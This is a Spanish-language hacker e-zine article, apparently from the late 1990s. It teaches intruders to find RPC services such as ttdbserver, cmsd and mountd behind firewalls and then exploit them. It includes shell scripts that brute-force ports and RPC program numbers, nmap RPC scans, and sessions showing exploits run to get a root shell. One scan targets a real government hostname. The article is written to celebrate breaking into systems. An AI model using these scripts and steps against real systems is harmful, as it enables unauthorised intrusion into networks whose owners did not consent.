+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Bueno se~ores, somos hackers o no??? a estas alturas supongo que sabreis
+reconocer cuando una maquina tiene un firewall delante o emplea algun tipo de 
+filtrado.
+
+Cualquier hacker que se precie debe controlar este tipo de cosas, sino lo
+llevais crudo.
+
+En el caso de los RPC siempre cabe el clasico truco de hacer un telnet:
+
+-------------------------------------------------
+$ telnet 1.1.1.1 111
+Trying 1.1.1.1...
+Connected to 1.1.1.1.
+Escape character is '^]'.
+
+$ rpcinfo -p 1.1.1.1
+=> No obtenemos respuesta
+-------------------------------------------------
+
+-------------------------------------------------
+$ telnet 1.1.1.1 111
+Trying 1.1.1.1...
+=> No obtenemos respuesta
+-------------------------------------------------
+
+-------------------------------------------------
+$ telnet 1.1.1.1 111
+Trying 1.1.1.1...
+Connected to 1.1.1.1.
+Escape character is '^]'.
+Connection closed by foreign host.
+-------------------------------------------------
+
+En cualquiera de los tres casos estamos ante algun tipo de filtrado que nos
+impide acceder al puerto 111 libremente.
+
+Y por supuesto como ultima opcion siempre tenemos el traceroute, que ademas
+nos servira para saber que tipos de paquetes filtra.
+
+
+Buscando servicios en concreto
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Bueno, una vez hemos asentado nuestos conocimientos sobre RPCs pasemos a la
+accion.
+
+Para ello creamos un script que se encargue de hacer un barrido de los
+puertos no firewalleados, en busca de un servicio RPC en concreto que nos
+pueda ser de utilidad. Como ejemplo un escaner del servicio ttdbserver:
+
+<++> rpc/ttb.sh
+#!/bin/sh
+# Uso: ttb host port
+L=$2
+while [ $L -lt 100000 ]
+do
+echo $L
+rpcinfo -n $L -t $1 100083
+L=`expr $L + 1`
+done
+<-->
+
+Veamos a este peque~o script en accion:
+
+-------------------------------------------------
+$ ttb 1.1.1.1 32770
+32770
+rpcinfo: RPC: Remote system error - Connection refused
+program 100083 is not available
+32771
+rpcinfo: RPC: Timed out
+program 100083 version 0 is not available
+32772
+program 100083 version 1 ready and waiting
+32773
+rpcinfo: RPC: Remote system error - Connection refused
+program 100083 is not available
+32774
+rpcinfo: RPC: Remote system error - Connection refused
+program 100083 is not available
+32775
+rpcinfo: RPC: Remote system error - Connection refused
+program 100083 is not available
+-------------------------------------------------
+
+Justo ahi lo tenemos, en el puerto 32772.
+
+-------------------------------------------------
+$ rpcinfo -n 32772 -t dns1.nasa.gov 100083
+program 100083 version 1 ready and waiting
+-------------------------------------------------
+
+Ahora solo queda usar nuestro exploit favorito contra ese puerto:
+
+-------------------------------------------------
+$ tt1
+Usage: tt1 [-ku] [-p port] [-f outfile] host cmd
+
+$ tt1 -k -p 32772 1.1.1.1 lalala
+$ tt1 -p 32772 1.1.1.1 
+$ telnet 1.1.1.1 1524
+Trying 1.1.1.1...
+Connected to 1.1.1.1.
+Escape character is '^]'.
+
+#
+-------------------------------------------------
+
+En este caso nos encontramos ante un servicio que se encuentra en un puerto
+tcp. En vez de usar nuestro script tambien podemos usar nuestro escaneador de
+puertos favorito y una vez sepamos los puertos abiertos ir usando el comando 
+rpcinfo a mano.
+
+Tambien podeis el programa rpcscan de halflife, que hace el mismo trabajo,
+aunque de forma menos visual :).
+
+Pero la mejor opcion es sin duda el nmap de Fyodor en sus ultimas versiones
+publicadas. (Yo tengo instalada la 2.3BETA10)
+
+-------------------------------------------------
+$ nmap -V
+
+nmap V. 2.3BETA10 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+-------------------------------------------------
+
+Este programa ahora incluye una potente, rapida y finalmente depurada opcion 
+de escaneo de puertos en busca de servicios RPC. No solo es muy potente sino
+que ademas nos dice que servicio esta activo en cada puerto sin necesidad
+de recurrir al rpcinfo.
+
+Su forma de uso es muy simple y debiais estar habituados al uso de este
+escaneador de puertos. (el mejor!)
+
+-------------------------------------------------
+$ nmap -sT -sR 1.1.1.1
+
+Starting nmap V. 2.3BETA10 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+Interesting ports on 1.1.1.1  (1.1.1.1):
+Port    State       Protocol  Service (RPC)
+111     open        tcp       sunrpc (portmapper V2)
+846     open        tcp       (status V1)
+879     open        tcp       (mountd V1-3)
+884     open        tcp       (mountd V1-3)
+889     open        tcp       (mountd V1-3)
+1024    open        tcp       unknown
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 7 seconds
+-------------------------------------------------
+
+Aunque como veis no ha sabido reconocer el nlockmgr en el puerto 1024, pero el
+resto del trabajo es brillante.
+
+En el caso de que el firewall hago un filtrado completo de todos los puertos,
+siempre nos puede quedar la oportunidad de que no filtre udp. En este caso 
+procedemos igual, pero en este caso usamos la opcion -u (udp) del rpcinfo.
+
+Veamos un ejemplo de este caso, un escaneador del servicio cmsd, que suele
+usar puertos udp:
+
+<++> rpc/csmb.sh
+#!/bin/sh
+# Uso: cmsb host port
+L=$2
+while [ $L -lt 100000 ]
+do
+echo $L
+rpcinfo -n $L -u $1 100068
+L=`expr $L + 1`
+done
+<-->
+
+Y en accion:
+
+-------------------------------------------------
+$ cmsb 1.1.1.1 30000
+=> Los puertos usados por el cmsd varian bastante mas que los usados por el
+ttdbserver, y necesitamos hacer un barrido mas amplio.
+30000
+rpcinfo: RPC: Program unavailable
+program 100068 version 0 is not available
+[...]
+32777
+rpcinfo: RPC: Program unavailable
+program 100068 version 0 is not available
+32778
+rpcinfo: RPC: Program unavailable
+program 100068 version 0 is not available
+32779
+program 100068 version 2 ready and waiting
+program 100068 version 3 ready and waiting
+program 100068 version 4 ready and waiting
+program 100068 version 5 ready and waiting
+32780
+rpcinfo: RPC: Unable to receive; errno = Connection refused
+program 100068 version 0 is not available
+32781
+-------------------------------------------------
+
+Bingo! puerto 32779! otro gigante caido...
+
+Si estamos desorientados y no sabemos que RPC reside en un puerto determinado,
+y no queremos hacer un script para cada servicio, siempre podemos averiguarlo
+por fuerza bruta.
+
+Aqui teneis un peque~o script para hacerlo:
+
+<++> rpc/rpb.sh
+#!/bin/sh
+# Uso: rpb host port
+L=100000
+while [ $L -lt 100500 ]
+do
+echo $L
+rpcinfo -n $2 -u $1 $L
+L=`expr $L + 1`
+done
+<-->
+
+Como veis usa udp, por si acaso, y va probando el codigo de servicio desde
+el 100000 hasta el 100500. Veamoslo en accion: 
+
+-------------------------------------------------
+$ rpb 1.1.1.1 890
+100000
+rpcinfo: RPC: Program unavailable
+program 100000 version 0 is not available
+100001
+rpcinfo: RPC: Program unavailable
+program 100001 version 0 is not available
+100002
+rpcinfo: RPC: Program unavailable
+program 100002 version 0 is not available
+100003
+rpcinfo: RPC: Program unavailable
+program 100003 version 0 is not available
+100004
+rpcinfo: RPC: Program unavailable
+program 100004 version 0 is not available
+100005
+program 100005 version 1 ready and waiting
+program 100005 version 2 ready and waiting
+program 100005 version 3 ready and waiting
+100006
+rpcinfo: RPC: Program unavailable
+program 100006 version 0 is not available
+-------------------------------------------------
+
+Perfecto, asi que en el puerto 890 tenemos el servicio 100005, miramos en el
+/etc/rpc y resulta ser el mountd. Ahora si es un linux, solo queda usar 
+nuestro exploit favorito para el mountd.
+
+-------------------------------------------------
+$ humpdee
+Usage: humpdee <hostname> <port> [spoofed src ip]
+
+$ humpdee 1.1.1.1 890
+-------------------------------------------------
+
+Filtros a mi! ya! ;)
+
+
+Despedida y cierre
+~~~~~~~~~~~~~~~~~~
+
+Parece curioso, sitios que antes parecian torreones invulnerables, imposibles
+de penetrar, caen ahora como castillos de naipes, simplemente con unos 
+sencillos conocimientos y un par de scripts. Y es que el mundo de los RPC
+esta muy poco explorado, pero es ampliamente prometedor para los hackers.
+
+Como decia mi abuela, no hay nada seguro en esta vida...
+
+Saludos
+
+
+BT-BoY <el_maestr0@bigfoot.com>
+
+
+*EOF*
